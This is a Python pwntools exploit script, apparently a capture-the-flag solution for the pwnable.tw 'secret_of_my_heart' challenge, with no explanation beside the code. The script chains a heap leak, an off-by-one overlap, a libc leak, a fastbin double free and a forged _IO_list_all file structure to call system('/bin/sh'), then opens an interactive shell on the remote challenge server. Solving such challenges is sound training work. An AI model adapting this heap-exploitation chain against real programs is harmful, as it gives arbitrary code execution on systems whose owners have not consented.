from pwn import *
import sys

def adds(size, name, secret):
	p.sendafter("choice :", "1")
	p.sendafter("heart :", str(size))
	p.sendafter("heart :", name)
	p.sendafter("heart :", secret)

def shows(index):
	p.sendafter("choice :", "2")
	p.sendafter("Index :", str(index))

def dels(index):
	p.sendafter("choice :", "3")
	p.sendafter("Index :", str(index))

b = ELF("./secret_of_my_heart")
l = ELF("./libc_64.so.6")

if len(sys.argv) == 1:
	p = process("./secret_of_my_heart", env={"LD_PRELOAD":"./libc_64.so.6"})
else:
	p = remote("chall.pwnable.tw", 10302)

# heap leak
adds(0x80, "0"*0x20, "0000")
shows(0)
p.recvuntil("0"*0x20)
leak = u64(p.recvline()[:-1].ljust(8, "\x00"))
log.info("leak = 0x%x" % leak)
heap = leak

# off by one
adds(0x68, "1111", "1111")
adds(0xf0, "2222", "2222")
adds(0x60, "3333", "3333")
adds(0x60, "4444", "4444")
dels(0)
dels(1)

payload = "1"*0x60
payload += p64(0x100)
adds(0x68, "1111", payload) # 0
dels(2)

# main arena leak
adds(0x80, "0000", "0000") # 1
shows(0)
p.recvuntil("Secret : ")
leak = u64(p.recvline()[:-1].ljust(8, "\x00"))
log.info("leak = 0x%x" % leak)
libc = leak - 0x3c3b78 #0x3c4b78

_IO_list_all = libc + 0x3c4520
system = libc + l.symbols['system']

# double free
adds(0x60, "1111", "1111") # 2
dels(0)
dels(3)
dels(2)

payload = "/bin/sh\x00"
payload += p64(0) * 3
payload += p64(0) + p64(1)
payload = payload.ljust(0xd8, "\x00")
payload += p64(heap + 0x200)
adds(0xf0, "fengshui", payload)

payload = p64(_IO_list_all - 0x23)
adds(0x60, "0000", payload)
payload = p64(system) * 8
adds(0x60, "3333", payload)
adds(0x60, p64(0xdeadbeef), p64(0xdeadbeef))
payload = "a" * (3 + 0x10)
payload += p64(heap+0x100)
adds(0x60, "aaaa", payload)
p.sendafter("choice :", "4869")
p.interactive()

